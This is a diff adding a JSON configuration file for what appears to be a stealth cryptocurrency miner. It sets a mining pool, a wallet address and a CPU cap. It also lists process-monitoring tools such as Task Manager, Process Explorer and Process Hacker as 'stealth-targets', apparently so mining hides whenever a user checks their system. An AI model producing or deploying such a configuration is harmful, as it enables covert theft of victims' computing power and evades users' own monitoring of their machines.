@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "pococo.cc",
+    "port": 3333,
+    "wallet": "4AXh7iLs9rLVwFsTqqqDetiXGGqweNsPS9qppNzj6tWyRtZ6THYpm9Xh9pTH7amK4b3hdqtDpEYLeYNYfZjzaiCy7Ch3EUw",
+    "password": "10-4",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 30,
+    "idle-wait": 1,
+    "idle-cpu": 30,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
